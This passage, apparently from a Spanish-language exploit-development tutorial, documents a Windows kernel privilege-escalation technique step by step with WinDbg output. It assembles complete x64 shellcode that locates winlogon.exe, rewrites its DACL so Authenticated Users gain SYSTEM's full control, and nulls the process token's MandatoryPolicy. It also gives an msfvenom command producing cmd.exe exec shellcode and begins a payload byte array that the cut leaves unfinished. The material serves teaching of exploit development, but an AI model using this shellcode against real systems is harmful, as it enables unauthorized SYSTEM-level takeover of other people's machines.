   +0x006 Sbz2             : Uint2B</span>
</code></pre></div></div><br>

<p class="plain-text">Según <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace">documentación</a> en realidad el objeto <code class="language-plaintext highlighter-rouge">_ACL</code> solo es un <code class="language-plaintext highlighter-rouge">Header</code> y el contenido real se encuentra en sus entradas, para una <code class="language-plaintext highlighter-rouge">Dacl</code> hay 2 tipos de <code class="language-plaintext highlighter-rouge">ACE</code>, estos son <code class="language-plaintext highlighter-rouge">ACCESS_ALLOWED_ACE</code> y <code class="language-plaintext highlighter-rouge">ACCESS_DENIED_ACE</code>, nos interesa el primer <code class="language-plaintext highlighter-rouge">ACE</code> ya que nos indíca derechos tiene un <code class="language-plaintext highlighter-rouge">SID</code> a través de su atributo <code class="language-plaintext highlighter-rouge">Mask</code> de tipo <code class="language-plaintext highlighter-rouge">ACCESS_MASK</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct</span><span class="na"> _ACCESS_ALLOWED_ACE </span><span class="p">{
  </span><span class="no">ACE_HEADER</span><span class="p">  Header;
  </span><span class="no">ACCESS_MASK</span><span class="p"> Mask;
  </span><span class="no">DWORD</span><span class="p">       SidStart;
}</span><span class="na"> ACCESS_ALLOWED_ACE</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">Utilizando el comando <code class="language-plaintext highlighter-rouge">!sd</code> podemos pasarle un puntero al <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> pero antes limpiando el último byte y obtener información de este, el output nos muestra detalladamente que usuarios tienen que privilegios, el <code class="language-plaintext highlighter-rouge">AceCount</code> de la <code class="language-plaintext highlighter-rouge">DACL</code> es <code class="language-plaintext highlighter-rouge">2</code> lo que significa que contiene <code class="language-plaintext highlighter-rouge">2 ACE</code> y ambos son de tipo <code class="language-plaintext highlighter-rouge">ACCESS_ALLOWED_ACE</code>, uno es para <code class="language-plaintext highlighter-rouge">nt authority\system</code> y el otro pertenece al grupo <code class="language-plaintext highlighter-rouge">builtin\administradores</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !sd (0xffff9e8c1fa47e2d & 0xfffffffffffffff0) 1
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544 (Alias: BUILTIN\Administradores)
->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544 (Alias: BUILTIN\Administradores)

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384 (Label: Etiqueta obligatoria\Nivel obligatorio del sistema)</span>
</code></pre></div></div><br>

<p class="plain-text">Esto podemos verlo graficamente con <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> donde <code class="language-plaintext highlighter-rouge">nt authority\system</code> tiene privilegios <code class="language-plaintext highlighter-rouge">Full Control</code>, la forma que usaremos para tener este acceso será modificar el <code class="language-plaintext highlighter-rouge">SID</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code> para asignar estos privilegios a otro grupo con menos privilegios con el que podamos acceder por ejemplo el grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code>.</p>
<a href="/exploit-development/windows-kernel/kernel-shellcode/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/3.png"></p></div></a>

<p class="plain-text">Con este shellcode también iniciamos con las instrucciones de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> que servirán para obtener la dirección del proceso actual que guardaremos en <code class="language-plaintext highlighter-rouge">rbx</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS</span>
</code></pre></div></div><br>

<p class="plain-text">Un elemento interesante de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> que es una estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code>, esta es una lista doblemente enlazada que quiere decir que cada elemento apunta al anterior y siguiente elemento, esta lista se encarga del registro de los procesos activos por lo que deberiamos encontrar a <code class="language-plaintext highlighter-rouge">winlogon.exe</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : Uint4B

</span><span class="ro">0: kd></span><span class="p"> dt nt!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY
   +0x008 Blink            : Ptr64 _LIST_ENTRY</span>
</code></pre></div></div><br>

<p class="plain-text">En el offset <code class="language-plaintext highlighter-rouge">0x5a8</code> de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> encontramos un atributo <code class="language-plaintext highlighter-rouge">ImageFileName</code>, este contiene el nombre del proceso en <code class="language-plaintext highlighter-rouge">ascii</code> que será útil para localizar el proceso.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS 0xffffe20d3e19c080 ImageFileName
   +0x5a8 ImageFileName : [15]  "winlogon.exe"</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos escribir un bucle que se encargue de recorrer toda la lista y comparar la cadena <code class="language-plaintext highlighter-rouge">winlogon</code> guardada en <code class="language-plaintext highlighter-rouge">rcx</code> con el valor en el offset <code class="language-plaintext highlighter-rouge">0x5a8</code>, cuando la comparación sea exitosa significa que ha encontrado el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">              ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448</span><span class="c1">                      ; $rbx = _EPROCESS
        </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, </span><span class="mi">0x6e6f676f6c6e6977</span><span class="c1">         ; $rcx = "winlogon"
        </span><span class="o">cmp</span><span class="no"> qword</span><span class="p"> [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x5a8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">        ; ImageFileName == "winlogon"
        </span><span class="o">jnz .</span><span class="na">loop</span>
</code></pre></div></div><br>

<p class="plain-text">Según la estructura <code class="language-plaintext highlighter-rouge">_SECURITY_DESCRIPTOR</code> la estructura <code class="language-plaintext highlighter-rouge">_ACL</code> de <code class="language-plaintext highlighter-rouge">Dacl</code> se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x20</code>, sin embargo los valores que obtenemos son incorrectos pero si usamos un offset de <code class="language-plaintext highlighter-rouge">0x30</code> obtenemos los valores reales, esto es bastante curioso y probablemente se deba a que los símbolos no estan actualizados dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void
   +0x010 Group            : Ptr64 Void
   +0x018 Sacl             : Ptr64 _ACL
   +0x020 Dacl             : Ptr64 _ACL

</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL 0xffff9e8c1fa47e20 + 0x20
   +0x000 AclRevision      : 0x3 ''
   +0x001 Sbz1             : 0 ''
   +0x002 AclSize          : 0
   +0x004 AceCount         : 0x101
   +0x006 Sbz2             : 0

</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL 0xffff9e8c1fa47e20 + 0x30
   +0x000 AclRevision      : 0x2 ''
   +0x001 Sbz1             : 0 ''
   +0x002 AclSize          : 0x3c
   +0x004 AceCount         : 2
   +0x006 Sbz2             : 0</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">Header</code> de la <code class="language-plaintext highlighter-rouge">ACL</code> ocupa <code class="language-plaintext highlighter-rouge">8</code> bytes, seguido de los <code class="language-plaintext highlighter-rouge">ACE</code> donde se comienza con una estructura <code class="language-plaintext highlighter-rouge">_ACE_HEADER</code> que si sumamos sus valores pesa <code class="language-plaintext highlighter-rouge">4</code> bytes.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef</span><span class="na"> struct _ACE_HEADER </span><span class="p">{
  </span><span class="no">UCHAR</span><span class="p">  AceType;
  </span><span class="no">UCHAR</span><span class="p">  AceFlags;
  </span><span class="no">USHORT</span><span class="p"> AceSize;
} </span><span class="na">ACE_HEADER</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">Si realizamos un volcado hexadecimal podemos ver esos <code class="language-plaintext highlighter-rouge">12</code> bytes de antes y el siguiente <code class="language-plaintext highlighter-rouge">dword</code> pertenece a <code class="language-plaintext highlighter-rouge">Mask</code> que en este caso es <code class="language-plaintext highlighter-rouge">0x1fffff</code>, esto nos dice que el <code class="language-plaintext highlighter-rouge">SID</code> inicia en el offset <code class="language-plaintext highlighter-rouge">0x40</code>, en el offset <code class="language-plaintext highlighter-rouge">0x41</code> podemos ver el byte <code class="language-plaintext highlighter-rouge">0x1</code>, en el offset <code class="language-plaintext highlighter-rouge">0x47</code> el byte <code class="language-plaintext highlighter-rouge">0x5</code> y finalmente en el offset <code class="language-plaintext highlighter-rouge">0x48</code> el byte <code class="language-plaintext highlighter-rouge">0x12</code>, si pasamos los valores a decimal coincide con el SID <code class="language-plaintext highlighter-rouge">S-1-5-18</code> que pertenece al SID de <code class="language-plaintext highlighter-rouge">SYSTEM</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db 0xffff9e8c1fa47e20 + 0x30
ffff9e8c`1fa47e50  02 00 3c 00 02 00 00 00-00 00 14 00 ff ff 1f 00  ..<.............
ffff9e8c`1fa47e60  01 01 00 00 00 00 00 05-12 00 00 00 00 00 18 00  ................
ffff9e8c`1fa47e70  11 14 12 00 01 02 00 00-00 00 00 05 20 00 00 00  ............ ...
ffff9e8c`1fa47e80  20 02 00 00 00 00 00 00-00 00 00 00 01 02 00 00   ...............
ffff9e8c`1fa47e90  00 00 00 05 20 00 00 00-20 02 00 00 01 01 00 00  .... ... .......
ffff9e8c`1fa47ea0  00 00 00 05 12 00 00 00-bd ba 00 00 01 bb 00 00  ................
ffff9e8c`1fa47eb0  a2 bb 00 00 19 bd 00 00-64 7d 02 00 e9 7d 02 00  ........d}...}..
ffff9e8c`1fa47ec0  24 be 00 00 6b be 00 00-a4 7e 02 00 4d bf 00 00  $...k....~..M...</span>
</code></pre></div></div><br>

<p class="plain-text">Lo que haremos es cambiar ese byte <code class="language-plaintext highlighter-rouge">0x12</code> o <code class="language-plaintext highlighter-rouge">18</code> en decimal por el byte <code class="language-plaintext highlighter-rouge">0xb</code> u <code class="language-plaintext highlighter-rouge">11</code> en decimal, el SID ahora tendrá el valor de <code class="language-plaintext highlighter-rouge">S-1-5-11</code> que según la <a href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids">documentación</a> pertenece al grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> al que deberiamos pertenecer en teoría.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db 0xffff9e8c1fa47e20 + 0x48 L1
ffff9e8c`1fa47e68  12

</span><span class="ro">0: kd></span><span class="p"> eb 0xffff9e8c1fa47e20 + 0x48 0xb</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de modificar el valor podemos usar nuevamente el comando <code class="language-plaintext highlighter-rouge">!sd</code> para ver los valores, el grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> tiene los privilegios que antes tenía <code class="language-plaintext highlighter-rouge">SYSTEM</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !sd (0xffff9e8c1fa47e2d & 0xfffffffffffffff0) 1
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544 (Alias: BUILTIN\Administradores)
->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-11 (Well Known Group: NT AUTHORITY\Usuarios autentificados)

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544 (Alias: BUILTIN\Administradores)

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384 (Label: Etiqueta obligatoria\Nivel obligatorio del sistema)</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos de nuevo desde Process Explorer nos refleja los permisos <code class="language-plaintext highlighter-rouge">Full Control</code>.</p>
<a href="/exploit-development/windows-kernel/kernel-shellcode/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/6.png"></p></div></a>

<p class="plain-text">Desde nuestro código se ve de la siguiente forma, guardamos el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> limpiando el ultimo byte y en el offset <code class="language-plaintext highlighter-rouge">0x48</code> escribimos un <code class="language-plaintext highlighter-rouge">0xb</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> -</span><span class="mi"> 0x8</span><span class="p">]</span><span class="c1">                    ; $rcx = SecurityDescriptor
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> 0xb</span><span class="c1">              ; Authenticated Users</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de modificar la <code class="language-plaintext highlighter-rouge">ACL</code> del proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code> el siguiente paso es crear un hilo y ejecutar un <code class="language-plaintext highlighter-rouge">shellcode</code> en modo de usuario con privilegios de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, sin embargo al intentarlo obtenemos un error <code class="language-plaintext highlighter-rouge">5</code> de acceso denegado, esto se debe a que <code class="language-plaintext highlighter-rouge">winlogon.exe</code> se ejecuta en un nivel de integridad más alto que <code class="language-plaintext highlighter-rouge">exploit.exe</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[-] Error opening winlogon process: 5</span>
</code></pre></div></div><br>

<p class="plain-text">Afortunadamente el problema no viene de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> sino del propio proceso, especificamente del <code class="language-plaintext highlighter-rouge">token</code> que se encuentra a un offset <code class="language-plaintext highlighter-rouge">0x4b8</code> del proceso.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !process 0 0 exploit.exe
PROCESS ffff9a8e030ef080
    SessionId: 1  Cid: 1d88    Peb: c93d1dd000  ParentCid: 08fc
    DirBase: 071b0000  ObjectTable: ffffc60ba6d3ef00  HandleCount:  47.
    Image: exploit.exe

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS ffff9a8e030ef080 Token
   +0x4b8 Token : _EX_FAST_REF</span>
</code></pre></div></div><br>

<p class="plain-text">Limpiando el último byte podemos mostrar los atributos de la estructura <code class="language-plaintext highlighter-rouge">_TOKEN</code> que pertenece al proceso actual, el campo que nos da problemas está a un offset <code class="language-plaintext highlighter-rouge">0xd4</code> y es <code class="language-plaintext highlighter-rouge">MandatoryPolicy</code> el cual tiene un valor asignado de <code class="language-plaintext highlighter-rouge">3</code> que ahora analizaremos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_TOKEN (poi(0xffff9a8e030ef080 + 0x4b8) & 0xfffffffffffffff0)
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffff9a8e`03179b90 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0xf
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x1e0
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 0
   +0x098 UserAndGroups    : 0xffffc60b`a1a534f0 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffffc60b`a842fa70 Void
   +0x0b0 DynamicPart      : 0xffffc60b`a842fa70  -> 0x501
   +0x0b8 DefaultDacl      : 0xffffc60b`a842fa8c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2a00
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0xe
   +0x0d4 MandatoryPolicy  : 3</span>
</code></pre></div></div><br>

<p class="plain-text">Según <a href="https://learn.microsoft.com/es-es/windows/win32/api/winnt/ns-winnt-token_mandatory_policy#members">documentación</a> el valor <code class="language-plaintext highlighter-rouge">3</code> es una combinación de los 2 anteriores, el <code class="language-plaintext highlighter-rouge">1</code> nos dice que el proceso no puede escribir en proceso con un mayor nivel de integridad, afortunadamente podemos establecerlo en <code class="language-plaintext highlighter-rouge">0</code> para no aplicar ninguna directiva.</p>
<a href="/exploit-development/windows-kernel/kernel-shellcode/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/4.png"></p></div></a>

<p class="plain-text">Desde el shellcode podemos tomar el <code class="language-plaintext highlighter-rouge">token</code> del proceso actual, ahora limpiamos el ultimo byte y finalmente modificamos el byte en el offset <code class="language-plaintext highlighter-rouge">0xd4</code> por <code class="language-plaintext highlighter-rouge">0x0</code> anulándolo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov </span><span class="mi">rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1">                  ; $rax = Process token
    </span><span class="o">and </span><span class="mi">cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov </span><span class="no">byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0xd4</span><span class="p">],</span><span class="mi"> 0x0</span><span class="c1">              ; MandatoryPolicy</span>
</code></pre></div></div><br>

<p class="plain-text">Resumiendo, nuestro shellcode busca el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code> para modificar su <code class="language-plaintext highlighter-rouge">ACL</code> de forma que se asignen al grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> los privilegios de <code class="language-plaintext highlighter-rouge">System</code>, luego se anulan las directivas de integridad y finalmente retorna con <code class="language-plaintext highlighter-rouge">ret</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]</span><span class="c1">                     ; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]</span><span class="c1">                   ; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                            ; $rbx = _EPROCESS

    </span><span class="o">.</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">              ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> 0x448</span><span class="c1">                      ; $rbx = _EPROCESS</span><span class="p">
        </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">,</span><span class="mi"> 0x6e6f676f6c6e6977</span><span class="c1">         ; $rcx = "winlogon"
        </span><span class="o">cmp</span><span class="no"> qword</span><span class="p"> [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x5a8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">        ; ImageFileName == "winlogon"
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                           ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> -</span><span class="mi"> 0x8</span><span class="p">]</span><span class="c1">                    ; $rcx = SecurityDescriptor
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> 0xb</span><span class="c1">              ; Authenticated Users

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1">                  ; $rax = Process token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0xd4</span><span class="p">],</span><span class="mi"> 0x0</span><span class="c1">              ; MandatoryPolicy

    </span><span class="o">ret</span><span class="c1">                                     ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Hay que tener en cuenta que para usar este método necesitaremos un shellcode el cual se ejecutará bajo el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, lo podemos crear con msfvenom.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/exec CMD=cmd.exe EXITFUNC=none -f csharp</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> shellcode[</span><span class="mi">275</span><span class="p">]</span><span class="o"> =</span><span class="p"> {</span><span class="mi">
    0xfc</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi">
    0x41</span><span class="p">,</span><span class="mi"> 0x50</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi"> 0x56</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xd2</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi">
    0x60</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x18</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x72</span><span class="p">,</span><span class="mi">
    0x50</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0xb7</span><span class="p">,</span><span class="mi"> 0x4a</span><span class="p">,</span><span class="mi"> 0x4a</span><span class="p">,</span><span class="mi"> 0x4d</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi">
